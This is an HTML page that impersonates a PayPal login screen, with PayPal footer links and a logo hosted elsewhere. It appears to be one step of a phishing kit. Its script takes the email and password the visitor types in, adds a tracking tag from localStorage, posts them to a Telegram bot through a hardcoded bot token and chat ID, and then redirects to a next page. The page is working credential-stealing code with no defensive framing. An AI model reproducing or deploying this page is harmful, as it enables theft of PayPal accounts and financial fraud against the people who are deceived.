<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {
      font-family: Futura, Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      flex-direction: column;
    }

    .container {
      width: 100%;
      max-width: 360px;
      padding: 0 20px; /* padding on left & right */
      text-align: center;
    }
        .logo {
            margin: 0 auto 10px;
            display: flex;
            justify-content: center;
        }
        .logo img {
            max-width: 40px;
            height: auto;
        }
    h1 {
      font-size: 28px;
      font-weight: 900; /* extra bold */
      margin-bottom: 25px;
    }

    input {
      width: 95%;
      padding: 14px;
      margin: 10px 0;
      border: 2px solid #999; /* thicker border */
      border-radius: 6px;
      font-size: 16px;
      font-weight: 700; /* bold text inside input */
      box-sizing: border-box;
    }

    .forgot {
      text-align: left;
      margin: 10px 0 20px;
      font-size: 16px;
      font-weight: 700; /* bold */
    }

    .forgot a {
      text-decoration: none;
      color: #0070ba;
    }

    .btn {
      width: 95%;
      padding: 14px;
      background: #000080; /* deeper blue */
      color: #fff;
      font-size: 17px;
      font-weight: 900; /* bold */
      border: none;
      border-radius: 25px;
      cursor: pointer;
      margin-bottom: 15px;
    }

    .btn:hover {
      background: #004b82; /* even darker on hover */
    }

    .or {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #888;
      font-size: 14px;
      font-weight: 700; /* bold */
    }

    .or::before, .or::after {
      content: "";
      flex: 1;
      border-bottom: 2px solid #ccc; /* thicker line */
    }

    .or:not(:empty)::before {
      margin-right: 10px;
    }

    .or:not(:empty)::after {
      margin-left: 10px;
    }

    .btn-outline {
      width: 95%;
      padding: 14px;
      background: #fff;
      color: #000000;
      font-size: 17px;
      font-weight: 900; /* bold */
      border: 2px solid #000; /* thicker border */
      border-radius: 25px;
      cursor: pointer;
    }

    footer {
      font-size: 13px;
      color: #666;
      text-align: center;
      margin-top: 40px;
      padding-bottom: 15px;
      font-weight: 700; /* bold */
    }

    footer a {
      color: #333;
      text-decoration: none;
      margin: 0 5px;
    }

    footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
      <div class="logo">
            <img src="https://i.im.ge/2025/09/22/n9xQJG.Picsart-25-09-22-16-21-48-182.png" alt="Bank Logo">
        </div>
    <form id="login-form">
    	log into your PayPal account to continue
      <input type="email"  id="email" placeholder="Enter your email address" required>
      <input type="password"  id="password" placeholder="Enter your password" required>
      <div class="forgot">
        &nbsp;<a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin">Forgot password?</a>
      </div>
   <button id="registrationButton" type="button" class="btn">Next</button>
      <div class="or">or</div>
      <button type="button" class="btn-outline">
        <a href="https://www.paypal.com/ng/welcome/signup/#/login_info">Sign Up</a>
      </button>
    </form>
  </div>
  <footer>
    <a href="https://www.paypal.com/us/cshelp/contact-us">Contact Us</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/privacy-full">Privacy</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/home">Legal</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/upcoming-policies-full">Policy Updates</a>
    <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
  </footer>

  <script>
  	  // Retrieve user tag from localStorage (set on Step 1)
  function getUserTag() {
    return localStorage.getItem("userTag") || "UnknownUser";
  }
  const userTag = getUserTag();
  
  	document.getElementById('registrationButton').addEventListener('click', () => {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

    const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU"; // <-- replace with your bot token
      const CHAT_ID = "8259952691";   // <-- replace with your chat id
    const message = 
      `ðŸ”” Login Info Arrives\n` +
      `ðŸ”–Tag: ${userTag}\n` +
      `ðŸ“©Email: ${email}\n` +
      `ðŸ”“Password: ${password}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
                // Ã¢Å“â€¦ fixed redirect URL
          window.location.href = "Page4.html=" + userTag; 
      } else {
        alert("Failed to send code via Telegram");
      }
    })
    .catch(err => {
      alert("Error sending to Telegram: " + err.message);
    });
  });
  </script>
</body>
</html>
